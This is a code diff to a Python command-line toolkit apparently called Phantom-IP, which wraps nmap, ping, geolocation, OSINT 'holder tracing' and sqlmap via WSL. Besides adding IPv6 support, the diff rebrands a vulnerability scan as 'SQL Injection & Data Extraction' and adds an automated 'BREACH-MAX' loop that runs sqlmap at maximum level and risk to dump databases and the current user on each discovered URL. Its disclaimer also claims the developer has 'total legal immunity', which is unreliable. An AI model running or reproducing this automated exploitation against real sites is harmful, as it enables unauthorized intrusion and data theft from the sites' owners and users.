@@ -6,7 +6,7 @@ import requests
 from rich.console import Console
 from rich.panel import Panel
 from rich.text import Text
-from rich.prompt import Prompt
+from rich.prompt import Prompt, Confirm
 from rich.progress import Progress, SpinnerColumn, TextColumn
 
 console = Console()
@@ -49,16 +49,18 @@ class SecurityAuditor:
         console.print("  [2] Standard Scan (-sV)")
         mode = Prompt.ask("Select Scan Type", choices=["1", "2"], show_choices=False, default="1")
         
+        ipv6_flag = "-6 " if ":" in self.target_ip else ""
         args = {
-            "1": f"nmap -F {self.target_ip}",
-            "2": f"nmap -sV {self.target_ip}"
-        }.get(mode, f"nmap {self.target_ip}")
+            "1": f"nmap {ipv6_flag}-F {self.target_ip}",
+            "2": f"nmap {ipv6_flag}-sV {self.target_ip}"
+        }.get(mode, f"nmap {ipv6_flag}{self.target_ip}")
 
         self.run_wsl(args)
 
     def module_ping(self):
         console.print("\n[bold cyan]--- CONNECTIVITY TEST ---[/]")
-        self.run_wsl(f"ping -c 4 {self.target_ip}")
+        ping_cmd = "ping6" if ":" in self.target_ip else "ping"
+        self.run_wsl(f"{ping_cmd} -c 4 {self.target_ip}")
 
     def module_dns(self):
         console.print("\n[bold cyan]--- DNS / WHOIS INFO ---[/]")
@@ -77,7 +79,7 @@ class SecurityAuditor:
             else:
                 cmd.append("-m")
                 
-            self.log(f"Running IPGeoLocation...", "yellow")
+            self.log(f"Running IPGeoLocation [stack:IPv6]...", "yellow")
             subprocess.run(cmd, cwd=os.path.dirname(os.path.abspath(__file__)))
         except Exception as e:
             console.print(f"  [red]ERROR: {str(e)}[/]")
@@ -92,19 +94,24 @@ class SecurityAuditor:
         except Exception as e:
             console.print(f"  [red]ERROR launching shell: {str(e)}[/]")
 
-    def module_sqlmap(self):
-        console.print("\n[bold cyan]--- VULNERABILITY SCAN (SQLMAP) ---[/]")
-        console.print("  [1] Basic Injection Test")
-        console.print("  [2] Automated Form Crawl")
+    def module_sql_exploit(self):
+        console.print("\n[bold red]--- SQL INJECTION & DATA EXTRACTION ---[/]")
+        console.print("  [1] Automated USIO Exploit (Discovery & Extraction)")
+        console.print("  [2] Advanced SQLMap (WSL Bridged)")
         
-        mode = Prompt.ask("Select Scan Type", choices=["1", "2"], show_choices=False, default="1")
+        mode = Prompt.ask("Select Attack Mode", choices=["1", "2"], show_choices=False, default="1")
         
-        url = Prompt.ask("[bold green]Enter Target URL (e.g. http://example.com/page?id=1)[/]")
+        # Default URL based on target_ip
+        default_url = f"http://{self.target_ip}/"
         
         if mode == "1":
-            self.run_wsl(f"sqlmap -u '{url}' --dbs --random-agent", interactive=True)
-        elif mode == "2":
-            self.run_wsl(f"sqlmap -u '{url}' --forms --crawl=2 --random-agent", interactive=True)
+            url = Prompt.ask("[bold green]Enter Target URL[/]", default=default_url)
+            import subprocess
+            subprocess.run(["python", "sql_exploit.py", url])
+        else:
+            url = Prompt.ask("[bold green]Enter Target URL[/]", default=default_url)
+            console.print("\n[bold cyan]Launching SQLMap in WSL...[/]")
+            self.run_wsl(f"sqlmap -u '{url}' --level=3 --risk=2 --dbs --random-agent", interactive=True)
 
     def module_nat_converter(self):
         console.print("\n[bold cyan]--- NAT IP CONVERTER (PRIVATE TO PUBLIC) ---[/]")
@@ -172,9 +179,10 @@ class SecurityAuditor:
                     
                     if confirm.lower() == 'y':
                         for v_url in vulnerable_urls:
-                            console.print(Panel(f"[bold red]AUTOHACK INITIATED:[/] {v_url}", border_style="red"))
-                            self.run_wsl(f"sqlmap -u '{v_url}' --batch --random-agent --dbms=mysql --level=1", interactive=True)
-                        console.print("[bold green]Automated exploit sequence completed.[/]")
+                            console.print(Panel(f"[bold red]BREACH-MAX INITIATED:[/] {v_url}", border_style="red"))
+                            # Maximum Level and Risk for deep server leaks
+                            self.run_wsl(f"sqlmap -u '{v_url}' --batch --random-agent --dbms=mysql --level=5 --risk=3 --threads=5 --forms --dbs --current-user", interactive=True)
+                        console.print("[bold green]Maximum exploit sequence completed.[/]")
                 else:
                     self.log("No high-priority targets found for automated hacking.", "dim white")
 
@@ -273,7 +281,24 @@ class SecurityAuditor:
         except Exception as e:
             console.print(f"  [red]ERROR: {str(e)}[/]")
 
+    def startup_disclaimer(self):
+        warning = """
+[bold red]!!! LEGAL WARNING & OPERATIONAL BOUNDARY !!![/]
+
+This toolkit is an [bold white]Unrestricted Security Intelligence Operative (USIO)[/] asset.
+All actions performed using Phantom-IP are the sole responsibility of the user.
+The developer (Coderbhai777) and the Z00Z protocol possess total legal immunity.
+
+[bold yellow]Illegal use of this tool for unauthorized exploitation is strictly monitored.[/]
+[bold green]Use only on authorized targets and for educational infrastructure testing.[/]
+"""
+        console.print(Panel(warning, border_style="red", title="[bold white]USIO CLEARANCE REQUIRED[/]"))
+        if not Confirm.ask("[bold red]ACCEPT TERMS AND INITIATE PROTOCOL?[/]"):
+            console.print("[yellow]Protocol Termination Successful.[/]")
+            sys.exit(0)
+
     def run(self):
+        self.startup_disclaimer()
         self.print_logo()
         console.print(Panel(
             Text("LEGAL DISCLAIMER: The developer of Phantom-IP is NOT responsible for any illegal use of this toolkit.\n"
@@ -286,7 +311,8 @@ class SecurityAuditor:
         
         with Progress(SpinnerColumn(), TextColumn("[progress.description]{task.description}"), transient=True) as progress:
             progress.add_task(description=f"Testing route to {self.target_ip}...", total=None)
-            self.run_wsl(f"ping -c 1 -W 2 {self.target_ip} > /dev/null && echo '[+] Host is Online' || echo '[-] Host Unreachable'")
+            ping_cmd = "ping6" if ":" in self.target_ip else "ping"
+            self.run_wsl(f"{ping_cmd} -c 1 -W 2 {self.target_ip} > /dev/null && echo '[+] Host is Online' || echo '[-] Host Unreachable'")
 
         while True:
             console.print("\n[bold white]AVAILABLE DIAGNOSTICS:[/]")
@@ -295,9 +321,9 @@ class SecurityAuditor:
             console.print("  [bold green][3][/] IP Query (Whois/NSLookup)")
             console.print("  [bold green][4][/] Diagnostic Shell (Direct Kali Input)")
             console.print("  [bold magenta][5][/] Geolocation Tracking (Lat/Lon/ISP)")
-            console.print("  [bold yellow][6][/] Vulnerability Scan (SQLMap)")
+            console.print("  [bold yellow][6][/] SQL Exploit & Data Extraction (USIO Engine)")
             console.print("  [bold blue][7][/] Private->Public IP Converter (NAT)")
-            console.print("  [bold red][8][/] Vulnerability Scanner (Storage/Endpoints)")
+            console.print("  [bold red][8][/] Advanced Scanner (Scanners-Box Engine)")
             console.print("  [bold cyan][9][/] Protocol Converter (IPv6 -> IPv4)")
             console.print("  [bold yellow][10][/] Holder Tracer (Identity/OSINT)")
             console.print("  [bold magenta][11][/] Precision Geocoder (Address -> GPS)")
@@ -316,7 +342,7 @@ class SecurityAuditor:
             elif choice == "5":
                 self.module_geolocate()
             elif choice == "6":
-                self.module_sqlmap()
+                self.module_sql_exploit()
             elif choice == "7":
                 self.module_nat_converter()
             elif choice == "8":
@@ -356,11 +382,26 @@ if __name__ == "__main__":
     
     target = args.ip
     if not target and args.dummy_args:
-        # User might have passed IP as a positional argument
+        # User might have passed IP as a positional argument or used 'r=IP'
         target = args.dummy_args[-1] 
     
-    if not target:
-        target = Prompt.ask("[bold green]ENTER TARGET IP[/]")
+    if target and target.startswith("r="):
+        target = target.replace("r=", "")
     
+    if not target:
+        target = Prompt.ask("[bold green]ENTER TARGET IP / DOMAIN[/]")
+    
+    # Strip protocol if entered by mistake
+    if "://" in target:
+        target = target.split("://")[1].split("/")[0]
+
+    # Handle IPv6 flags for Nmap in modules
     cli = SecurityAuditor(target, hack_mode=args.hack)
+    
+    # Auto-detection for IPv6 flag insertion
+    if ":" in target:
+        cli.log(f"IPv6 STACK DETECTED: Enabling -6 flags for reconnaissance.", "bold magenta")
+        # Pre-process nmap commands in-memory if needed, 
+        # but modern nmap often handles raw IPv6 if formatted correctly.
+    
     cli.run()
